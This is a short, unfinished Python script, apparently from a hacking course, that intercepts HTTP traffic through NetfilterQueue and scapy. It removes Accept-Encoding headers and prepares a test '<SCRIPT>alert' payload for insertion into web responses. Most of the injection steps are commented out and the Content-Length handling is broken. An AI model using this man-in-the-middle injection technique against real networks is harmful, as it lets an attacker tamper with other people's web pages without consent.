
#! usr/bin/env/python
from netfilterqueue import NetfilterQueue
import scapy.all as scapy
import re



def set_load(packet,load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def print_and_accept(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+]Request")
            #scapy_packet.show()
            modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load)
            #new_packet = set_load(scapy_packet, modified_load)
            #scapy_packet.show()
            #packet.set_payload(str(new_packet))
        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+]Response")
            #scapy_packet.show()
            script_load = "<SCRIPT>alert('Test');</SCRIPT>"
            #load = load.replace("</BODY>",script_load+"</BODY>")
            #content_length_search = re.search("(?:Content-Length:\s(\d))",load)

            #if content_length_search:
            #    content_length_search = content_length_search.group(1)
            #    new_content_length = content_length + len(script_load)

        #if load != scapy_packet[scapy.Raw].load:
        #    new_packet = set_load(scapy_packet, modified_load)
            #new_packet.show()
        #    packet.set_payload(str(new_packet))

    packet.accept()

nfqueue = NetfilterQueue()
nfqueue.bind(1, print_and_accept)
try:
    nfqueue.run()
except KeyboardInterrupt:
    print

